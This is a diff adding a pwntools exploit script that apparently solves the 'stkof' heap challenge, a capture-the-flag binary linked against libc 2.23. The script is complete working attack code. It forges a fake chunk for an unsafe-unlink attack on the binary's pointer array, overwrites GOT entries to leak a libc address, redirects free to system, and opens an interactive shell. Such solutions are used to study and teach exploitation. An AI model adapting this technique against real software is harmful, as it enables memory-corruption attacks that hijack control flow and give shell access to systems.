@@ -1,0 +1,73 @@
+from pwn import *
+
+e = ELF("./stkof_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+p = process("./stkof_patched")
+'''
+p = gdb.debug("./stkof_patched", gdbscript = 
+set follow-fork-mode parent
+b *0x400C1C
+b *0x400B7A
+)
+'''
+
+def malloc(size):
+    p.sendline(b"1")
+    p.sendline(f"{size}".encode())
+    p.recvuntil(b"OK\n")
+    
+def read_data(index, size, data):
+    p.sendline(b"2")
+    p.sendline(f"{index}".encode())
+    p.sendline(f"{size}".encode())
+    p.send(data)
+    p.recvuntil(b"OK\n")
+
+def free(index):
+    p.sendline(b"3")
+    p.sendline(f"{index}".encode())
+    p.recvuntil(b"OK\n")
+
+def print_data(index):
+    p.sendline(b"4")
+    p.sendline(f"{index}".encode())
+    leak = u64(p.recvline()[:-1:].ljust(8, b"\x00"))
+    p.recvuntil(b"OK\n")
+    return leak
+
+malloc(0xa0)
+malloc(0xa0)
+malloc(0xa0)
+malloc(0xa0)
+
+#ptr array at 0x602140
+fake_chunk = b""
+fake_chunk += p64(0) + p64(0xa0)
+fake_chunk += p64(0x602138) + p64(0x602140)
+fake_chunk += p64(0) + p64(0)
+fake_chunk += p64(0) * 14
+fake_chunk += p64(0xa0) + p64(0xb0)
+
+read_data(2, len(fake_chunk), fake_chunk)
+free(3)
+
+strlen_got = e.got['strlen']
+puts_plt = e.plt['puts']
+free_got = e.got['free']
+read_data(2, 0x28, p64(0) * 2 + p64(strlen_got) + p64(0x602138) + p64(free_got))
+read_data(1, 0x8, p64(puts_plt))
+
+libc_base = print_data(3) - libc.symbols['free']
+print(hex(libc_base))
+
+system = libc_base + libc.symbols['system']
+read_data(3, 0x8, p64(system))
+read_data(4, 0x8, b"/bin/sh\x00")
+
+#free(4) # the p.recvuntil(b"OK\n") se lam script bi treo
+p.sendline(b"3")
+p.sendline(b"4")
+
+p.interactive()
